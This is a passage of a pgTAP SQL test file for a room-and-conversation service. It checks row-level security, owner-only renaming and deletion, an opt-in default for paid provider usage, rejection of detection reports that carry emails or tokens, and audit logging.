-- ===========================================================================
reset role;
select pg_temp.act_as_user('user_TeamBob000001');
select throws_ok($$ select public.delete_room(pg_temp.id('roomA')) $$, 'P0002', null,
  'another owner cannot delete the room');
select throws_ok($$ select public.rename_room(pg_temp.id('roomA'), 'Mine now') $$, 'P0002', null,
  'or rename it');
select throws_ok($$ select public.remove_conversation(pg_temp.id('chat')) $$, 'P0002', null,
  'or remove someone else''s conversation');
select is((select count(*)::int from public.rooms), 1, 'RLS: Bob sees only his own room');

reset role;
select pg_temp.act_as_user('user_TeamAlice00001');
select is((select count(*)::int from public.rooms), 2, 'RLS: Alice sees her rooms');
select is((select count(*)::int from public.team_jobs where id = pg_temp.id('bjob')), 0,
  'RLS: Alice cannot see Bob''s job');
select is(public.rename_room(pg_temp.id('roomA'), 'Prism v2') ->> 'name', 'Prism v2', 'the owner renames a room');
select is(public.archive_room(pg_temp.id('roomB'), true) ->> 'status', 'archived', 'and archives one');

-- Paid usage: off by default, only the owner call turns it on.
select is(public.set_provider_profile('codex', 'plus', null, null) ->> 'paid_usage_enabled', 'false',
  'paid usage defaults to off');
select throws_ok($$ select public.set_provider_profile('codex', 'max_20x') $$, '22023', null,
  'a Claude plan is not a ChatGPT plan');
select throws_ok($$ select public.set_provider_profile('gemini') $$, '22023', null, 'an unknown provider is refused');
reset role;
select pg_temp.act_as_client();
select public.report_provider_detection(pg_temp.h('a-rt'), 'codex',
  '{"installed":true,"version":"0.155","authMethod":"chatgpt","detectedPlan":"plus"}');
select is((pg_temp.profile('user_TeamAlice00001', 'codex')).paid_usage_enabled, false,
  'the Runtime''s detection report cannot turn paid usage on');
select throws_ok($$ select public.report_provider_detection(pg_temp.h('a-rt'), 'codex',
  '{"installed":true,"email":"alice@example.com"}') $$, '22023', null,
  'a detection carrying an email is refused');
select throws_ok($$ select public.report_provider_detection(pg_temp.h('a-rt'), 'codex',
  '{"capabilities":{"accessToken":"x"}}') $$, '22023', null,
  'a detection carrying a token anywhere is refused');
select throws_ok($$ select public.report_provider_detection(pg_temp.h('a-chat'), 'codex', '{}') $$, '42501', null,
  'a controller cannot report detection');
reset role;
select pg_temp.act_as_user('user_TeamAlice00001');
select is(public.set_provider_profile('codex', null, null, true) ->> 'paid_usage_enabled', 'true',
  'the owner can switch paid usage on explicitly');
select is(public.set_provider_profile('codex', 'pro') ->> 'paid_usage_enabled', 'true',
  'and a later plan change leaves it as the owner set it');

-- Deleting a room: status + detach; the carrier tasks' history stays.
select is(public.delete_room(pg_temp.id('roomA')) ->> 'status', 'deleted', 'the owner deletes a room');
select is((pg_temp.room(pg_temp.id('roomA'))).agent_session_id, null, 'which detaches it');
select is(pg_temp.task_count(pg_temp.id('carrier')), 1, 'the carrier task history is untouched');
select is((pg_temp.task(pg_temp.id('carrier'))).status, 'claimed', 'and its status is unchanged');
select throws_ok($$ select public.rename_room(pg_temp.id('roomA'), 'Back') $$, 'P0002', null,
  'a deleted room is gone for good');
reset role;
select pg_temp.act_as_client();
select throws_ok($$ select public.get_room(pg_temp.h('a-chat'), pg_temp.id('chat'), pg_temp.id('roomA')) $$,
  'P0002', null, 'the controller no longer sees a deleted room');

-- Remove a conversation from ThreadLink: retire + revoke links, nothing else.
reset role;
select pg_temp.act_as_user('user_TeamAlice00001');
select is((public.remove_conversation(pg_temp.id('chat')) ->> 'links_revoked')::int, 2,
  'removing a conversation revokes its links');
select is((pg_temp.session(pg_temp.id('chat'))).status, 'retired', 'and retires the binding');
select is(public.remove_conversation(pg_temp.id('chat')) ->> 'native_history_deleted', 'false',
  'it is idempotent and never claims to delete provider history');
select ok(pg_temp.audit_count('room.deleted') >= 1 and pg_temp.audit_count('provider.profile_updated') >= 1
  and pg_temp.audit_count('team.job_started') >= 1 and pg_temp.audit_count('team.job_finished') >= 1
  and pg_temp.audit_count('team.decision') >= 1 and pg_temp.audit_count('room.created') >= 1,
  'every team action is audited');

select * from finish();
rollback;
